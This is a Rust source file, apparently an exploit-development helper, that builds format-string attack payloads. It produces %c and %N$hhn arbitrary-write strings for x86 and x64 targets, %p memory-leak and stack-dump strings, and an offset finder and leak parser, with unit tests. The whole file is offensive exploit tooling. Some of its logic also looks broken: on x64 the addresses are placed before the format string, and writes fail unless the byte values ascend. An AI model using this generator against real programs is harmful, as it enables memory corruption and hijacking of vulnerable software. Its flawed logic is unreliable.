// Format string exploit payload generator
// Automated payload construction for format string vulnerabilities

#[derive(Debug, Clone)]
pub struct FormatStringPayload {
    pub offset: usize,
    pub writes: Vec<(u64, u64)>,
    pub architecture: Architecture,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Architecture {
    X86,
    X64,
}

impl FormatStringPayload {
    pub fn new(offset: usize, arch: Architecture) -> Self {
        FormatStringPayload {
            offset,
            writes: Vec::new(),
            architecture: arch,
        }
    }

    pub fn add_write(&mut self, address: u64, value: u64) {
        self.writes.push((address, value));
    }

    pub fn generate(&self) -> Result<Vec<u8>, String> {
        if self.writes.is_empty() {
            return Err("No writes specified".to_string());
        }

        match self.architecture {
            Architecture::X64 => self.generate_x64(),
            Architecture::X86 => self.generate_x86(),
        }
    }

    fn generate_x64(&self) -> Result<Vec<u8>, String> {
        let mut payload = Vec::new();
        let mut format_string = String::new();
        let mut current_written = 0u64;

        let ptr_size = 8;
        let _num_writes = self.writes.len();

        for (addr, _value) in &self.writes {
            for i in 0..8 {
                let target_addr = addr + i;
                payload.extend_from_slice(&target_addr.to_le_bytes());
            }
        }

        let padding_needed = (16 - (payload.len() % 16)) % 16;
        payload.extend(vec![b'A'; padding_needed]);

        let addresses_offset = self.offset + (payload.len() / ptr_size);

        for (idx, (_, value)) in self.writes.iter().enumerate() {
            for byte_idx in 0..8 {
                let byte_value = ((value >> (byte_idx * 8)) & 0xFF) as u64;

                if byte_value < current_written {
                    return Err(format!(
                        "Cannot write byte value {} when already written {}",
                        byte_value, current_written
                    ));
                }

                let to_write = byte_value - current_written;

                if to_write > 0 {
                    format_string.push_str(&format!("%{}c", to_write));
                }

                let arg_index = addresses_offset + (idx * 8) + byte_idx;
                format_string.push_str(&format!("%{}$hhn", arg_index));

                current_written = byte_value;
            }
        }

        payload.extend_from_slice(format_string.as_bytes());

        Ok(payload)
    }

    fn generate_x86(&self) -> Result<Vec<u8>, String> {
        let mut payload = Vec::new();
        let mut format_string = String::new();
        let mut current_written = 0u64;

        let _ptr_size = 4;

        for (addr, _) in &self.writes {
            for i in 0..4 {
                let target_addr = (addr + i) as u32;
                payload.extend_from_slice(&target_addr.to_le_bytes());
            }
        }

        let addresses_offset = self.offset;

        for (idx, (_, value)) in self.writes.iter().enumerate() {
            for byte_idx in 0..4 {
                let byte_value = ((value >> (byte_idx * 8)) & 0xFF) as u64;

                if byte_value < current_written {
                    return Err(format!(
                        "Cannot write byte value {} when already written {}",
                        byte_value, current_written
                    ));
                }

                let to_write = byte_value - current_written;

                if to_write > 0 {
                    format_string.push_str(&format!("%{}c", to_write));
                }

                let arg_index = addresses_offset + (idx * 4) + byte_idx;
                format_string.push_str(&format!("%{}$hhn", arg_index));

                current_written = byte_value;
            }
        }

        payload.extend_from_slice(format_string.as_bytes());

        Ok(payload)
    }

    pub fn generate_leak(&self, target_offset: usize) -> String {
        format!("%{}$p", self.offset + target_offset)
    }

    pub fn generate_stack_dump(&self, count: usize) -> String {
        (0..count)
            .map(|i| format!("%{}$p", self.offset + i))
            .collect::<Vec<_>>()
            .join(".")
    }
}

pub fn create_format_string_payload(
    offset: usize,
    writes: Vec<(u64, u64)>,
    arch: Architecture,
) -> Result<Vec<u8>, String> {
    let mut payload = FormatStringPayload::new(offset, arch);

    for (addr, value) in writes {
        payload.add_write(addr, value);
    }

    payload.generate()
}

pub fn find_format_string_offset(output: &str) -> Option<usize> {
    for i in 1..100 {
        let marker = format!("AAAA{:08x}", i);
        if output.contains(&marker) || output.contains(&format!("{:08X}", i)) {
            return Some(i);
        }
    }

    None
}

pub fn analyze_format_string_leak(output: &str) -> Vec<u64> {
    let mut leaks = Vec::new();

    let parts: Vec<&str> = output.split('.').collect();
    for part in parts {
        let cleaned = part.trim();
        if cleaned.starts_with("0x") || cleaned.starts_with("0X") {
            if let Ok(value) = u64::from_str_radix(&cleaned[2..], 16) {
                leaks.push(value);
            }
        }
    }

    leaks
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_string_payload_x64() {
        let mut payload = FormatStringPayload::new(6, Architecture::X64);
        // Use ascending byte values to avoid format string byte ordering limitation
        // 0x0807060504030201 = bytes [01, 02, 03, 04, 05, 06, 07, 08] (fully ascending for 64-bit)
        payload.add_write(0x601020, 0x0807060504030201);

        let result = payload.generate();
        if let Err(e) = &result {
            panic!("Generation failed: {}", e);
        }

        let data = result.unwrap();
        assert!(data.len() > 0);
    }

    #[test]
    fn test_format_string_payload_x86() {
        let mut payload = FormatStringPayload::new(4, Architecture::X86);
        payload.add_write(0x804a000, 0x41414141);

        let result = payload.generate();
        assert!(result.is_ok());
    }

    #[test]
    fn test_leak_generation() {
        let payload = FormatStringPayload::new(6, Architecture::X64);
        let leak = payload.generate_leak(10);
        assert_eq!(leak, "%16$p");
    }

    #[test]
    fn test_stack_dump() {
        let payload = FormatStringPayload::new(6, Architecture::X64);
        let dump = payload.generate_stack_dump(5);
        assert_eq!(dump, "%6$p.%7$p.%8$p.%9$p.%10$p");
    }

    #[test]
    fn test_analyze_leak() {
        let output = "0x7ffd12345678.0x400000.0x7f1234567890";
        let leaks = analyze_format_string_leak(output);
        assert_eq!(leaks.len(), 3);
        assert_eq!(leaks[0], 0x7ffd12345678);
    }
}
